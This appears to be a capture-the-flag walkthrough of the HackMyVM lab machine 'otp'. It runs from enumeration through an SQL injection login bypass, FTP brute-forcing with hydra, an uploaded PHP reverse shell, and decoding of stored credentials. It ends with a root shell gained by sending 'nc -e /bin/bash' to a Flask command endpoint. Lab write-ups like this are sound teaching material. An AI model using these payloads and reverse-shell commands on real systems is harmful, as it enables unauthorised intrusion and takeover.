Target: 10.0.0.21

    $ nmap -sS -A -T4 -p- 10.0.0.21

    PORT   STATE SERVICE VERSION
    21/tcp open  ftp     vsftpd 3.0.3
    80/tcp open  http    Apache httpd 2.4.51
    |_http-title: Did not follow redirect to http://otp.hmv/
    |_http-server-header: Apache/2.4.51 (Debian)

We can't log to FTP yet. It doesn't seem like we can log into FTP from the 'outside'.

## ***HTTP***

Going to ***http://10.0.0.21*** we are redirected to opt.hmv. After adding the domain name to the ***/etc/hosts*** file we can start enumerating HTTP.

I tried enumerating the directories of the web server but found no useful files.  
Since this is a domain I tried to find subdomains using '***gobuster***'.

    # gobuster vhost -u http://otp.hmv/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -z | grep "Status: 200"

    Found: totp.otp.hmv (Status: 200) [Size: 2431]
    Found: argon.otp.hmv (Status: 200) [Size: 25537] 

Now that we found the subdomains, let's add them to the ***/etc/hosts*** file as well.

Going to ***http://totp.otp.hmv*** we have a login page.  

![image](https://user-images.githubusercontent.com/76552238/163454297-55815ce3-7050-4c09-9664-7fc1f1248f29.png)

We are able to bypass the login by entering this SQL injection payload ***' or 1=1 #***.  

In order to continue we need to enter a 6 digit OTP (One Time Password).

![image](https://user-images.githubusercontent.com/76552238/163472133-a5143a8a-433a-448d-a74f-3d5e1e963fb2.png)

We are able to bypass this as well by passing the same SQL injection payload.  

![image](https://user-images.githubusercontent.com/76552238/163472283-de3c576a-58e6-42c6-a957-ed3ba1e3ad99.png)

Using the dev tools we can find something interesting.  

![image](https://user-images.githubusercontent.com/76552238/163472710-5ebd9656-e97f-4d4a-83c6-c6e9e1132335.png)

At this point I didn't know what to do. We might have to find more information in order to be able to continue this part.

Going to  ***http://argon.otp.hmv***, we have a site running the 'argon' service.
Going to the User Profile tab and looking at the comments, we can find credentials to a user.

![image](https://user-images.githubusercontent.com/76552238/163458508-114ad61d-aea6-4322-83d8-56cdb0a0176b.png)

After logging we are prompted with this message. This might be a possible user for FTP.

![image](https://user-images.githubusercontent.com/76552238/163458335-a16ea12c-f393-4ab6-9146-131bd758179a.png)

    # ftp david@10.0.0.21

![image](https://user-images.githubusercontent.com/76552238/163458645-2a252828-3db6-47a3-903e-151d999a95f1.png)

We are prompted to enter a password in contrast to the other logins. This means the user 'david' is on the machine.

## ***FTP***

Let's brute force the login using 'hydra'.

    # hydra -l 'david' -P /usr/share/wordlists/rockyou.txt ftp://10.0.0.21 -IV

    [21][ftp] host: 10.0.0.21   login: david   password: DAVID

After logging to FTP, we have a important text file. It holds this message:

### ***important_note.txt:***

    "Many times, the idea we come up with is not to fit for the current times but if launched at the right time can do wonders."

Let's log in to the server using 'lftp'.

    # lftp -u david,DAVID 10.0.0.21

> 

    $ cat /etc/apache2/sites-available/argon.conf

    <VirtualHost *:80>
            # The ServerName directive sets the request scheme, hostname and port that
            # the server uses to identify itself. This is used when creating
            # redirection URLs. In the context of virtual hosts, the ServerName
            # specifies what hostname must appear in the request's Host: header to
            # match this virtual host. For the default virtual host (this file) this
            # value is not decisive as it is used as a last resort host regardless.
            # However, you must set it for any further virtual host explicitly.
            ServerName argon.otp.hmv

            #ServerAdmin webmaster@localhost
            DocumentRoot /var/www/otp/argon
            ErrorLog ${APACHE_LOG_DIR}/error.log
            CustomLog ${APACHE_LOG_DIR}/access.log combined

            # For most configuration files from conf-available/, which are
            # enabled or disabled at a global level, it is possible to
            # include a line for only one particular virtual host. For example the
            # following line enables the CGI configuration for this host only
            # after it has been globally disabled with "a2disconf".
            #Include conf-available/serve-cgi-bin.conf
    </VirtualHost>

Going to ***/var/www/otp/argon/u9l04d_*** we can upload a reverse shell and access it from our local machine.  

    $ lcd /root/Desktop/Tools/Privilege-Escalation/php-reverse-shell
    $ put php-reverse-shell.php

>

Going to ***http://argon.otp.hmv/u9l04d_/php-reverse-shell.php*** and setting a listener on our local machine we are able to get a reverse shell.

    Local Machine:

    nc -lvp 4444
    listening on [any] 4444 ...
    connect to [10.0.0.27] from otp.hmv [10.0.0.21] 46448
    Linux otp 5.10.0-9-amd64 #1 SMP Debian 5.10.70-1 (2021-09-30) x86_64 GNU/Linux
    16:11:45 up  1:33,  0 users,  load average: 1.23, 1.09, 1.13
    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    /bin/sh: 0: can't access tty; job control turned off
    $ id -a
    uid=33(www-data) gid=33(www-data) groups=33(www-data)

## ***PRIVILEGE ESCALATION***

Going to the /home directory we can see the machine has the user 'avijneyam' on it.

    $ sudo -ll

    Matching Defaults entries for www-data on otp:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

    User www-data may run the following commands on otp:

    Sudoers entry:
        RunAsUsers: !avijneyam
        Options: !authenticate
        Commands:
            /bin/bash

The user '***www-data***' can run ***/bin/bash*** with sudo with all the users but the user ***'avijneyam'***.

After uploading linPeas to the machine, I found a file on the ***/opt*** directory.
Going to the ***/opt*** directory we can find the ***creds.sql***.

### ***/opt/creds.sql:***

    -- MariaDB dump 10.19  Distrib 10.5.12-MariaDB, for debian-linux-gnu (x86_64)
    --
    -- Host: localhost    Database: otp
    -- ------------------------------------------------------
    -- Server version       10.5.12-MariaDB-0+deb11u1

    /*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
    /*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
    /*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
    /*!40101 SET NAMES utf8mb4 */;
    /*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
    /*!40103 SET TIME_ZONE='+00:00' */;
    /*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
    /*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
    /*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
    /*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

    --
    -- Table structure for table `creds`
    --

    DROP TABLE IF EXISTS `creds`;
    /*!40101 SET @saved_cs_client     = @@character_set_client */;
    /*!40101 SET character_set_client = utf8 */;
    CREATE TABLE `creds` (
    `id` int(11) NOT NULL AUTO_INCREMENT,
    `username` varchar(255) NOT NULL,
    `password` varchar(255) NOT NULL,
    `totp` varchar(255) NOT NULL,
    PRIMARY KEY (`id`)
    ) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4;
    /*!40101 SET character_set_client = @saved_cs_client */;

    --
    -- Dumping data for table `creds`
    --

    LOCK TABLES `creds` WRITE;
    /*!40000 ALTER TABLE `creds` DISABLE KEYS */;
    INSERT INTO `creds` VALUES (1,'','','NYZXMM3SI4YG43RUI4QXMM3ZGBKXKUAK');
    /*!40000 ALTER TABLE `creds` ENABLE KEYS */;
    UNLOCK TABLES;
    /*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

    /*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
    /*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
    /*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
    /*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
    /*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
    /*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
    /*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

    -- Dump completed on 2021-11-20 10:46:17

We can find what seems to be a Base64 message in the file. I tired to decode it and turns out it is Base32 decoded.  

    # echo 'NYZXMM3SI4YG43RUI4QXMM3ZGBKXKUAK' | base32 -d
    n3v3rG0nn4G!v3y0UuP

I think I'm getting Rickrolled :(

Going back to http://totp.opt.hmv we can add our decoded message to the user's password.

    avijneyam:n3v3rG0nn4G!v3y0UuP___Cuz_HackMyVM_iS_theRe_Only_4_y0u_:) 

We can now log in as the user ***avijneyam*** on the remote machine.

    $ cat /home/avijneyam/flag_user.txt

    2990aa5108d5803f3fdca99c277ba352

    $ sudo -ll

    Matching Defaults entries for avijneyam on otp:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

    User avijneyam may run the following commands on otp:

    Sudoers entry:
        RunAsUsers: root
        Options: authenticate
        Commands:
            /bin/bash /root/localhost.sh

>

    $ sudo /bin/bash /root/localhost.sh

After running the command it seems like a webserver is running.  

![image](https://user-images.githubusercontent.com/76552238/163473542-3422e835-b3d7-4e04-b8bd-1fdfb65b526e.png)

We might need to use port forwarding here. The remote machine has the 'socat' command installed.

After running the script on the /root directory I was able to port forward the service running on ***127.0.0.1:5000*** to ***0.0.0.0:5001***

    Remote Machine:

    $ sudo /bin/bash /root/localhost.sh
    CTRL+Z

    $ socat tcp-listen:5001,fork tcp:127.0.0.1:5000

>

    Local Machine:

    #  nmap -T4 -p 5001 10.0.0.21

    PORT     STATE SERVICE
    5001/tcp open  commplex-link

We are now able to access it from our web browser.

### ***http://10.0.0.21:5001:***

![image](https://user-images.githubusercontent.com/76552238/163572651-1838af27-85dc-4a0c-97e2-afdb010b901d.png)

    # gobuster dir -u http://10.0.0.21:5001/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

    /SourceCode           (Status: 200) [Size: 1216]

Going to ***http://10.0.0.21:5001/SourceCode*** we have an encoded Base64 string.

    # curl http://10.0.0.21:5001/SourceCode | base64 -d

    from subprocess import Popen, TimeoutExpired, PIPE
    from flask import Flask, jsonify, abort, request

    app = Flask(__name__)

    @app.route("/", methods=[""])
    def index():
        req_json = request.get_json()
        if req_json is None or "" not in req_json:
            abort(400, description="Please provide command in JSON request!")
        proc = Popen(req_json[""], stdout=PIPE, stderr=PIPE, shell=True)
        try:
            outs, errs = proc.communicate(timeout=1)
        except TimeoutExpired:
            proc.kill()
            abort(500, description="The timeout is expired!")
        if errs:
            abort(500, description=errs.decode('utf-8'))
        return jsonify(success=True, message=outs.decode('utf-8'))

    @app.errorhandler(400)
    def bad_request(error):
        return jsonify(success=False, message=error.description), 400

    @app.errorhandler(500)
    def server_error(error):
        return jsonify(success=False, message=error.description) , 500

We have the source code for the script ***localhost.sh*** on the root directory.

    Local Machine:

    # ffuf -c -w payloads.txt -u http://otp.hmv:5001/ -X PUT -H 'Content-Type: application/json' -d '{"FUZZ": "nc -e /bin/bash 10.0.0.21 4445"}'

    # nc -lnvp 4445
    connect to [10.0.0.27] from otp.hmv [10.0.0.21] 47886
    id -a
    uid=0(root) gid=0(root) groups=0(root)

>

    Remote Machine:

    # cat flag_r00t.txt
    8a2d55707a9084982649dadc04b426a0
